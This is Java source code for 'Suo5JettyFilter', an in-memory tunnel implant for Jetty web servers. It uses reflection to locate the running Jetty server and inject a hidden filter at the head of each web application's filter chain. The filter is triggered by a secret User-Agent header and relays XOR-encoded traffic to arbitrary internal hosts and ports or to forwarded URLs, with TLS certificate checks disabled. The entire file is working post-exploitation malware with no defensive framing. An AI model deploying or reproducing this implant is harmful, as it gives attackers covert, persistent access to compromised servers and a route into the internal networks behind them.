import javax.net.ssl.*;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.*;
import java.lang.reflect.Proxy;
import java.net.*;
import java.nio.ByteBuffer;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.*;

//jetty7-10.11 test
public class Suo5JettyFilter extends ClassLoader implements InvocationHandler, Runnable, HostnameVerifier, X509TrustManager {
    private HashMap parameterMap;
    private String urlPattern;
    private String userAgent;

    public static HashMap addrs = collectAddr();
    public static HashMap ctx = new HashMap();

    InputStream gInStream;
    OutputStream gOutStream;

    public String getp(String key) {
        try {
            return new String((byte[])this.parameterMap.get(key));
        } catch (Exception var3) {
            return null;
        }
    }

    public boolean equals(Object obj) {
        try {
            this.parameterMap = (HashMap)obj;
            this.urlPattern = getp("urlPattern");
            this.userAgent = getp("userAgent");
            return true;
        } catch (Exception var3) {
            return false;
        }
    }

    public String toString() {

        try {
            Class servletRequestFilterClass = null;
            try {
                servletRequestFilterClass = loadClasses("jakarta.servlet.Filter");
            } catch (Exception e) {
                try {
                    servletRequestFilterClass = loadClasses("javax.servlet.Filter");
                } catch (ClassNotFoundException ex) {

                }
            }
            if (servletRequestFilterClass != null){
                this.parameterMap.put("result", addFilter(Proxy.newProxyInstance(servletRequestFilterClass.getClassLoader(),new Class[]{servletRequestFilterClass},this),servletRequestFilterClass).getBytes());
                this.parameterMap = null;
            }
        }catch (Throwable e){

        }

        return "";
    }

    public Suo5JettyFilter() {
    }

    public Suo5JettyFilter(InputStream in, OutputStream out) {
        this.gInStream = in;
        this.gOutStream = out;
    }

    public Suo5JettyFilter(ClassLoader loader){
        super(loader);
    }


    public Class loadClasses(String className) throws ClassNotFoundException {
        ArrayList<ClassLoader> classLoaders = new ArrayList<>();
        classLoaders.add(this.getClass().getClassLoader());
        try {
            classLoaders.add(Thread.currentThread().getContextClassLoader());
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            int threadCount = threadGroup.activeCount();
            Thread[] threads = new Thread[threadCount];
            threadCount = threadGroup.enumerate(threads);
            for (int i = 0; i < threadCount; i++) {
                classLoaders.add(threads[i].getContextClassLoader());
            }
        }catch (Exception e){

        }
        int loaders = classLoaders.size();
        for (int i = 0; i < loaders; i++) {
            ClassLoader loader = classLoaders.get(i);
            if (loader!=null){
                try {
                    return Class.forName(className,true,loader);
                }catch(Throwable e){

                }
            }
        }
        return Class.forName(className);
    }


    public static Object[] getServers() throws Throwable {
        HashSet contexts = new HashSet();
        HashSet<String> blackType = new HashSet<String>();
        blackType.add(int.class.getName());
        blackType.add(short.class.getName());
        blackType.add(long.class.getName());
        blackType.add(double.class.getName());
        blackType.add(byte.class.getName());
        blackType.add(float.class.getName());
        blackType.add(char.class.getName());
        blackType.add(boolean.class.getName());
        blackType.add(Integer.class.getName());
        blackType.add(Short.class.getName());
        blackType.add(Long.class.getName());
        blackType.add(Double.class.getName());
        blackType.add(Byte.class.getName());
        blackType.add(Float.class.getName());
        blackType.add(Character.class.getName());
        blackType.add(Boolean.class.getName());
        blackType.add(String.class.getName());
        Object jettyServer = searchObject("org.eclipse.jetty.server.Server",Thread.currentThread(),new HashSet(),blackType,10,0);
        if (jettyServer != null) {
            try {
                Object serverHandle = getFieldValue(jettyServer,"_handler");
                Object handles = serverHandle.getClass().getMethod("getChildHandlers").invoke(serverHandle);
                if (handles.getClass().isArray()) {
                    int handleSize = Array.getLength(handles);
                    for (int i = 0; i < handleSize; i++) {
                        Object handle = Array.get(handles,i);
                        if (handle!=null && "org.eclipse.jetty.webapp.WebAppContext".equals(handle.getClass().getName())){
                            contexts.add(handle);
                        }
                    }
                }
            }catch (Throwable e){

            }
        }
        return contexts.toArray();
    }
    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDepth,int currentDepth)throws Throwable {
        currentDepth++;

        if (currentDepth >= maxDepth){
            return null;
        }

        if (object != null){

            if (targetClassName.equals(object.getClass().getName())){
                return object;
            }

            Integer hash = System.identityHashCode(object);
            if (!blacklist.contains(hash)) {
                blacklist.add(new Integer(hash));
                Field[] fields = null;
                ArrayList<Field> fieldsArray = new ArrayList();
                Class objClass = object.getClass();
                while (objClass != null){
                    Field[] fields1 = objClass.getDeclaredFields();
                    fieldsArray.addAll(Arrays.asList(fields1));
                    objClass = objClass.getSuperclass();
                }
                fields = fieldsArray.toArray(new Field[0]);


                for (int i = 0; i < fields.length; i++) {
                    Field field = fields[i];

                    try {
                        field.setAccessible(true);
                        Class fieldType = field.getType();
                        if (!blackType.contains(fieldType.getName())){
                            Object fieldValue = field.get(object);
                            if (fieldValue != null){
                                Object ret = null;
                                if (fieldType.isArray()){
                                    if (!blackType.contains(fieldType.getComponentType().getName())){
                                        int arraySize = Array.getLength(fieldValue);
                                        for (int j = 0; j < arraySize; j++) {
                                            ret = searchObject(targetClassName,Array.get(fieldValue,j),blacklist,blackType,maxDepth,currentDepth);
                                            if (ret!= null){
                                                break;
                                            }
                                        }
                                    }
                                }else{
                                    ret = searchObject(targetClassName,fieldValue,blacklist,blackType,maxDepth,currentDepth);
                                }
                                if (ret!= null){
                                    return ret;
                                }
                            }
                        }
                    }catch (Throwable e){

                    }
                }
            }
        }
        return null;

    }

    private String addFilter(Object filter, Class filterClass) throws Throwable {
        try {
            Object[] obj = getServers();
            for (int i = 0; i < obj.length; i++) {
                Object webappContext = obj[i];
                try {
                    Object servletHandler = getFieldValue(webappContext,"_servletHandler");
                    Class filterHolderClass = Class.forName("org.eclipse.jetty.servlet.FilterHolder",true,servletHandler.getClass().getClassLoader());
                    Class filterMappingClass = Class.forName("org.eclipse.jetty.servlet.FilterMapping",true,servletHandler.getClass().getClassLoader());
                    Constructor filterHolderConstructor = filterHolderClass.getConstructor(filterClass);
                    Object filterHolder = filterHolderConstructor.newInstance(filter);
                    Object filterMapping = filterMappingClass.newInstance();
                    Method setFilterHolderMethod = filterMappingClass.getDeclaredMethod("setFilterHolder",filterHolderClass);
                    setFilterHolderMethod.setAccessible(true);
                    setFilterHolderMethod.invoke(filterMapping,filterHolder);
                    filterMappingClass.getMethod("setPathSpecs",String[].class).invoke(filterMapping,new Object[]{new String[]{urlPattern}});

                    servletHandler.getClass().getMethod("addFilter",filterHolderClass).invoke(servletHandler,filterHolder);
                    servletHandler.getClass().getMethod("prependFilterMapping",filterMappingClass).invoke(servletHandler,filterMapping);
                } catch (Throwable e) {

                }
            }
        } catch (Throwable e) {
            return e.getMessage();
        }
        return "ok";
    }


    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().equals("doFilter")){
            Object servletRequest = args[0];
            Object servletResponse = args[1];
            Object filterChain = args[2];

            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse) servletResponse;
            String agent = request.getHeader("User-Agent");
            String contentType = request.getHeader("Content-Type");

            if (agent == null || !agent.equals(userAgent)) {
                if (filterChain != null) {
                    filterChain.getClass().getMethod("doFilter").invoke(servletRequest,servletResponse);
                }
                return null;
            }
            if (contentType == null) {
                return null;
            }

            try {
                if (contentType.equals("application/plain")) {
                    tryFullDuplex(request, response);
                    return null;
                }

                if (contentType.equals("application/octet-stream")) {
                    processDataBio(request, response);
                } else {
                    processDataUnary(request, response);
                }
            } catch (Throwable e) {
//                System.out.printf("process data error %s\n", e);
//                e.printStackTrace();
            }
        }
        return null;
    }

    private Object invokeMethod(Object obj,String methodName,Object... parameters){
        try {
            ArrayList classes = new ArrayList();
            if (parameters!=null){
                for (int i=0;i<parameters.length;i++){
                    Object o1=parameters[i];
                    if (o1!=null){
                        classes.add(o1.getClass());
                    }else{
                        classes.add(null);
                    }
                }
            }
            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[]{}));

            return method.invoke(obj, parameters);
        }catch (Exception e){
//        	e.printStackTrace();
        }
        return null;
    }

    private Method getMethodByClass(Class cs,String methodName,Class... parameters){
        Method method=null;
        while (cs!=null){
            try {
                method=cs.getMethod(methodName, parameters);
                cs=null;
            }catch (Exception e){
                cs=cs.getSuperclass();
            }
        }
        return method;
    }

    public static Field getField(Object obj, String fieldName){
        Class clazz = null;

        if(obj == null){
            return null;
        }

        if (obj instanceof Class){
            clazz = (Class)obj;
        }else {
            clazz = obj.getClass();
        }
        Field field = null;
        while (clazz!=null){
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            }catch (Exception e){
                clazz = clazz.getSuperclass();
            }
        }

        if (field != null){
            field.setAccessible(true);
        }

        return field;
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f=null;
        if (obj instanceof Field){
            f=(Field)obj;
        }else {
            f = getField(obj, fieldName);
        }
        if (f != null) {
            return f.get(obj);
        }
        return null;
    }
    public String getParameter(Object requestObject,String name) {
        return (String) invokeMethod(requestObject, "getParameter", name);
    }
    public String getContentType(Object requestObject) {
        return (String) invokeMethod(requestObject, "getContentType");
    }

    public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
        int bufferOffset = 0;
        while (bufferOffset < b.length) {
            int readLength = b.length - bufferOffset;
            int readResult = is.read(b, bufferOffset, readLength);
            if (readResult == -1) break;
            bufferOffset += readResult;
        }
    }

    public void tryFullDuplex(HttpServletRequest request, HttpServletResponse response) throws IOException, InterruptedException {
        InputStream in = request.getInputStream();
        byte[] data = new byte[32];
        readFull(in, data);
        OutputStream out = response.getOutputStream();
        out.write(data);
        out.flush();
    }


    private HashMap newCreate(byte s) {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x04});
        m.put("s", new byte[]{s});
        return m;
    }

    private HashMap newData(byte[] data) {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x01});
        m.put("dt", data);
        return m;
    }

    private HashMap newDel() {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x02});
        return m;
    }

    private HashMap newStatus(byte b) {
        HashMap m = new HashMap();
        m.put("s", new byte[]{b});
        return m;
    }

    byte[] u32toBytes(int i) {
        byte[] result = new byte[4];
        result[0] = (byte) (i >> 24);
        result[1] = (byte) (i >> 16);
        result[2] = (byte) (i >> 8);
        result[3] = (byte) (i /*>> 0*/);
        return result;
    }

    int bytesToU32(byte[] bytes) {
        return ((bytes[0] & 0xFF) << 24) |
                ((bytes[1] & 0xFF) << 16) |
                ((bytes[2] & 0xFF) << 8) |
                ((bytes[3] & 0xFF) << 0);
    }

    synchronized void put(String k, Object v) {
        ctx.put(k, v);
    }

    synchronized Object get(String k) {
        return ctx.get(k);
    }

    synchronized Object remove(String k) {
        return ctx.remove(k);
    }

    byte[] copyOfRange(byte[] original, int from, int to) {
        int newLength = to - from;
        if (newLength < 0) {
            throw new IllegalArgumentException(from + " > " + to);
        }
        byte[] copy = new byte[newLength];
        int copyLength = Math.min(original.length - from, newLength);
        // can't use System.arraycopy of Arrays.copyOf, there is no system in some environment
        // System.arraycopy(original, from, copy, 0,  copyLength);
        for (int i = 0; i < copyLength; i++) {
            copy[i] = original[from + i];
        }
        return copy;
    }


    private byte[] marshal(HashMap m) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        Object[] keys = m.keySet().toArray();
        for (int i = 0; i < keys.length; i++) {
            String key = (String) keys[i];
            byte[] value = (byte[]) m.get(key);
            buf.write((byte) key.length());
            buf.write(key.getBytes());
            buf.write(u32toBytes(value.length));
            buf.write(value);
        }

        byte[] data = buf.toByteArray();
        ByteBuffer dbuf = ByteBuffer.allocate(5 + data.length);
        dbuf.putInt(data.length);
        // xor key
        byte key = data[data.length / 2];
        dbuf.put(key);
        for (int i = 0; i < data.length; i++) {
            data[i] = (byte) (data[i] ^ key);
        }
        dbuf.put(data);
        return dbuf.array();
    }

    private HashMap unmarshal(InputStream in) throws Exception {
        byte[] header = new byte[4 + 1]; // size and datatype
        readFull(in, header);
        // read full
        ByteBuffer bb = ByteBuffer.wrap(header);
        int len = bb.getInt();
        int x = bb.get();
        if (len > 1024 * 1024 * 32) {
            throw new IOException("invalid len");
        }
        byte[] bs = new byte[len];
        readFull(in, bs);
        for (int i = 0; i < bs.length; i++) {
            bs[i] = (byte) (bs[i] ^ x);
        }
        HashMap m = new HashMap();
        byte[] buf;
        for (int i = 0; i < bs.length - 1; ) {
            short kLen = bs[i];
            i += 1;
            if (i + kLen >= bs.length) {
                throw new Exception("key len error");
            }
            if (kLen < 0) {
                throw new Exception("key len error");
            }
            buf = copyOfRange(bs, i, i + kLen);
            String key = new String(buf);
            i += kLen;

            if (i + 4 >= bs.length) {
                throw new Exception("value len error");
            }
            buf = copyOfRange(bs, i, i + 4);
            int vLen = bytesToU32(buf);
            i += 4;
            if (vLen < 0) {
                throw new Exception("value error");
            }

            if (i + vLen > bs.length) {
                throw new Exception("value error");
            }
            byte[] value = copyOfRange(bs, i, i + vLen);
            i += vLen;

            m.put(key, value);
        }
        return m;
    }

    private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
        final InputStream reqInputStream = request.getInputStream();
        HashMap dataMap = unmarshal(reqInputStream);

        byte[] action = (byte[]) dataMap.get("ac");
        if (action.length != 1 || action[0] != 0x00) {
            resp.setStatus(403);
            return;
        }
        resp.setBufferSize(512);
        final OutputStream respOutStream = resp.getOutputStream();

        // 0x00 create socket
        resp.setHeader("X-Accel-Buffering", "no");
        Socket sc;
        try {
            String host = new String((byte[]) dataMap.get("h"));
            int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
            if (port == 0) {
                port = request.getLocalPort();
            }
            sc = new Socket();
            sc.connect(new InetSocketAddress(host, port), 5000);
        } catch (Exception e) {
            respOutStream.write(marshal(newStatus((byte) 0x01)));
            respOutStream.flush();
            respOutStream.close();
            return;
        }

        respOutStream.write(marshal(newStatus((byte) 0x00)));
        respOutStream.flush();
        resp.flushBuffer();

        final OutputStream scOutStream = sc.getOutputStream();
        final InputStream scInStream = sc.getInputStream();

        Thread t = null;
        try {
            Suo5JettyFilter p = new Suo5JettyFilter(scInStream, respOutStream);
            t = new Thread(p);
            t.start();
            readReq(reqInputStream, scOutStream);
        } catch (Exception e) {
//                System.out.printf("pipe error, %s\n", e);
        } finally {
            sc.close();
            respOutStream.close();
            if (t != null) {
                t.join();
            }
        }
    }

    private void readSocket(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws IOException {
        byte[] readBuf = new byte[1024 * 8];
        while (true) {
            int n = inputStream.read(readBuf);
            if (n <= 0) {
                break;
            }
            byte[] dataTmp = copyOfRange(readBuf, 0, 0 + n);
            if (needMarshal) {
                dataTmp = marshal(newData(dataTmp));
            }
            outputStream.write(dataTmp);
            outputStream.flush();
        }
    }

    private void readReq(InputStream bufInputStream, OutputStream socketOutStream) throws Exception {
        while (true) {
            HashMap dataMap;
            dataMap = unmarshal(bufInputStream);

            byte[] actions = (byte[]) dataMap.get("ac");
            if (actions.length != 1) {
                return;
            }
            byte action = actions[0];
            if (action == 0x02) {
                socketOutStream.close();
                return;
            } else if (action == 0x01) {
                byte[] data = (byte[]) dataMap.get("dt");
                if (data.length != 0) {
                    socketOutStream.write(data);
                    socketOutStream.flush();
                }
            } else if (action == 0x03) {
                continue;
            } else {
                return;
            }
        }
    }

    private void processDataUnary(HttpServletRequest request, HttpServletResponse resp) throws
            Exception {
        InputStream is = request.getInputStream();
        BufferedInputStream reader = new BufferedInputStream(is);
        HashMap dataMap;
        dataMap = unmarshal(reader);


        String clientId = new String((byte[]) dataMap.get("id"));
        byte[] actions = (byte[]) dataMap.get("ac");
        if (actions.length != 1) {
            resp.setStatus(403);
            return;
        }
            /*
                ActionCreate    byte = 0x00
                ActionData      byte = 0x01
                ActionDelete    byte = 0x02
                ActionHeartbeat byte = 0x03
             */
        byte action = actions[0];
        byte[] redirectData = (byte[]) dataMap.get("r");
        boolean needRedirect = redirectData != null && redirectData.length > 0;
        String redirectUrl = "";
        if (needRedirect) {
            dataMap.remove("r");
            redirectUrl = new String(redirectData);
            needRedirect = !isLocalAddr(redirectUrl);
        }
        // load balance, send request with data to request url
        // action 0x00 need to pipe, see below
        if (needRedirect && action >= 0x01 && action <= 0x03) {
            HttpURLConnection conn = redirect(request, dataMap, redirectUrl);
            conn.disconnect();
            return;
        }

        resp.setBufferSize(512);
        OutputStream respOutStream = resp.getOutputStream();
        if (action == 0x02) {
            Object o = this.get(clientId);
            if (o == null) return;
            OutputStream scOutStream = (OutputStream) o;
            scOutStream.close();
            return;
        } else if (action == 0x01) {
            Object o = this.get(clientId);
            if (o == null) {
                respOutStream.write(marshal(newDel()));
                respOutStream.flush();
                respOutStream.close();
                return;
            }
            OutputStream scOutStream = (OutputStream) o;
            byte[] data = (byte[]) dataMap.get("dt");
            if (data.length != 0) {
                scOutStream.write(data);
                scOutStream.flush();
            }
            respOutStream.close();
            return;
        } else {
        }

        if (action != 0x00) {
            return;
        }
        // 0x00 create new tunnel
        resp.setHeader("X-Accel-Buffering", "no");
        String host = new String((byte[]) dataMap.get("h"));
        int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
        if (port == 0) {
            port = request.getLocalPort();
        }

        InputStream readFrom;
        Socket sc = null;
        HttpURLConnection conn = null;

        if (needRedirect) {
            // pipe redirect stream and current response body
            conn = redirect(request, dataMap, redirectUrl);
            readFrom = conn.getInputStream();
        } else {
            // pipe socket stream and current response body
            try {
                sc = new Socket();
                sc.connect(new InetSocketAddress(host, port), 5000);
                readFrom = sc.getInputStream();
                this.put(clientId, sc.getOutputStream());
                respOutStream.write(marshal(newStatus((byte) 0x00)));
                respOutStream.flush();
                resp.flushBuffer();
            } catch (Exception e) {
//                    System.out.printf("connect error %s\n", e);
//                    e.printStackTrace();
                this.remove(clientId);
                respOutStream.write(marshal(newStatus((byte) 0x01)));
                respOutStream.flush();
                respOutStream.close();
                return;
            }
        }
        try {
            readSocket(readFrom, respOutStream, !needRedirect);
        } catch (Exception e) {
//                System.out.println("socket error " + e.toString());
//                e.printStackTrace();
        } finally {
            if (sc != null) {
                sc.close();
            }
            if (conn != null) {
                conn.disconnect();
            }
            respOutStream.close();
            this.remove(clientId);
        }
    }

    public void run() {
        try {
            readSocket(gInStream, gOutStream, true);
        } catch (Exception e) {
//                System.out.printf("read socket error, %s\n", e);
//                e.printStackTrace();
        }
    }

    static HashMap collectAddr() {
        HashMap addrs = new HashMap();
        try {
            Enumeration nifs = NetworkInterface.getNetworkInterfaces();
            while (nifs.hasMoreElements()) {
                NetworkInterface nif = (NetworkInterface) nifs.nextElement();
                Enumeration addresses = nif.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = (InetAddress) addresses.nextElement();
                    String s = addr.getHostAddress();
                    if (s != null) {
                        // fe80:0:0:0:fb0d:5776:2d7c:da24%wlan4  strip %wlan4
                        int ifaceIndex = s.indexOf('%');
                        if (ifaceIndex != -1) {
                            s = s.substring(0, ifaceIndex);
                        }
                        addrs.put((Object) s, (Object) Boolean.TRUE);
                    }
                }
            }
        } catch (Exception e) {
//                System.out.printf("read socket error, %s\n", e);
//                e.printStackTrace();
        }
        return addrs;
    }

    boolean isLocalAddr(String url) throws Exception {
        String ip = (new URL(url)).getHost();
        return addrs.containsKey(ip);
    }

    HttpURLConnection redirect(HttpServletRequest request, HashMap dataMap, String rUrl) throws Exception {
        String method = request.getMethod();
        URL u = new URL(rUrl);
        HttpURLConnection conn = (HttpURLConnection) u.openConnection();
        conn.setRequestMethod(method);
        try {
            // conn.setConnectTimeout(3000);
            conn.getClass().getMethod("setConnectTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(3000)});
            // conn.setReadTimeout(0);
            conn.getClass().getMethod("setReadTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(0)});
        } catch (Exception e) {
            // java1.4
        }
        conn.setDoOutput(true);
        conn.setDoInput(true);

        // ignore ssl verify
        // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
        if (HttpsURLConnection.class.isInstance(conn)) {
            ((HttpsURLConnection) conn).setHostnameVerifier(this);
            SSLContext sslCtx = SSLContext.getInstance("SSL");
            sslCtx.init(null, new TrustManager[]{this}, null);
            ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
        }

        Enumeration headers = request.getHeaderNames();
        while (headers.hasMoreElements()) {
            String k = (String) headers.nextElement();
            conn.setRequestProperty(k, request.getHeader(k));
        }

        OutputStream rout = conn.getOutputStream();
        rout.write(marshal(dataMap));
        rout.flush();
        rout.close();
        conn.getResponseCode();
        return conn;
    }

    public boolean verify(String hostname, SSLSession session) {
        return true;
    }

    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
    }

    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
    }

    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }

}
